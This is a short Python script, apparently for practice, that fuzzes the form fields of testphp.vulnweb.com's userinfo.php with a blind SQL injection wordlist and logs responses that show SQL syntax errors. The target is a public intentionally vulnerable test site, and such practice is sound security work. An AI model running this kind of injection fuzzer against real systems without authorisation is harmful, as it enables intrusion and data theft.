#!/usr/bin/python3
import requests
import sys
target_url='http://testphp.vulnweb.com/'
#/opt/SecLists/Fuzzing/SQLi/Generic-BlindSQLi.fuzzdb.txt
wordlist = sys.argv[1] 

#1 - Authenticate 
post_payload = {'uname':'test',
                'pass':'test'}

# Proxy for debug
proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}

## The code
print("[-] Authenticating")
letsgo = requests.session()
auth = letsgo.post(target_url+'userinfo.php',data=post_payload, proxies=proxies)
print(auth.status_code)
print(auth.headers)
#exit()

print("[-]- Starting Fuzzing")
f=open(wordlist,'r')
lines = f.readlines()
log=open('logfile.out','a')
post_payload = {'urname':'Bob',
                'ucc':'1234-1234-1234',
                'uemail':'',
                'uphone':'232332',
                'uaddress':'addr addr 23:AC:DD:FF',
                'update':'update'
                }
#print(post_payload.values())
#print(post_payload.keys())
#print(len(post_payload))

# Get all the parameters and start iteration
for param in post_payload:
  print("[-] Starting Fuzzing for parameter: {}".format(param))
  #Read the wordlist for each parameter and fuzz
  for linetmp in lines: 
    line = linetmp.replace('\n','')
    post_payload[param]=line
    injection_point = letsgo.post(target_url+'userinfo.php',data=post_payload,proxies=proxies)
    status_code = injection_point.status_code
    content_lenght=injection_point.headers['Content-Length']
    time_elapsed = injection_point.elapsed.total_seconds()
    msg_request="[*] Param: {} HTTP Status Code: {} Content_lenght: {} Response Time: {} \n\tPayload: {}".format(param,status_code,content_lenght,time_elapsed,line)
    print(msg_request)
    if 'You have an error in your SQL syntax' in injection_point.text:
      print('[*] Reflective Value found, filtering out')
      msg_content='\t'+str(injection_point.content)
      log.write(msg_request+'\n')
      log.write(msg_content+'\n')
      print(msg_content)

#  print(injection_point.text)
